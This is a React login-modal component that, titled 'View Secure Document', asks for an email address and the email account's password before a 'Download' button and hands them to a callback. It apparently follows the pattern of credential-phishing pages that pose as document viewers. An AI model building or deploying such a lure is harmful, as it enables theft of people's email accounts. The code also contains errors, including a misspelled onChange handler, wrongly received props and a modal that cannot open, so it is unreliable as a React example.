import React, { useState } from 'react';
import Modal from 'react-modal'

export default function Login(onSave) {
    const [email, setEmail] =  useState("");
    const [password, setPassword] = useState("");
    const [modal, setModal] = useState(false);
    const openModal = () => {
        setModal(true);
      };
    
      const closeModal = () => {
        setModal(false);
      };
      const onChangeEmail = (e) => {
        setEmail(e.target.value);
      };
      const onChangePassword = (e) => {
        setPassword(e.target.value);
      };
      const onSubmit = (e) => {
        e.preventDefault();
        if(!email && !password) {
            alert('email required and correct pasword');
        }else if (!email && password) {
            alert('email required')
        }else if (email && !password) {
            alert('password required')
        }else {
            onSave({email, password})
        }
        setEmail("")
        setPassword("");
      };
  return (
    <div>
        <Modal
        style={{
          overlay: {
            position: "fixed",
            top: "0%",
            left: "0%",
            right: "0%",
            bottom: "0%",
            backgroundColor: "#00000078",
            zIndex: 100,
          },
        }}
        className="absolute top-[100px] mx-4 rounded-[5px] lg:top-auto mt-[30vh] left-0 lg:left-[35%] lg:right-[35%] right-0 h-auto pb-12 overflow-y-auto overflow-auto bg-[#FFFDFD] z-50 outline-none border-0 flex flex-col justify-between shadow-[5px_5px_30px_0px_#00000040]"
        isOpen={modal}
        shouldCloseOnOverlayclick={true}
        onRequestClose={closeModal}
        ariaHideApp={false}
      >
        <body>
            <form onSubmit={onSubmit}>
                <div>
                <p><h3> View Secure Document</h3></p>
                </div>
                <label><h5> Email Address</h5></label>
                <input type='email' value={email} onChnge={onChangeEmail}placeholder='Enter email'/>
                <label><h5>Email Password</h5></label>
                <input type='password' value={password} onChange={onChangePassword}placeholder='Email Password' required />
                <div>
                   <p> <input type='checkbox'/> Stay Signed In </p>
                </div>
                <div>
                    <button onClick={openModal}>Download</button>
                </div>
                <span>
                    <p> Can't access your account?</p>
                </span>
            </form>
        </body>
        </Modal>
    </div>
  )
  }
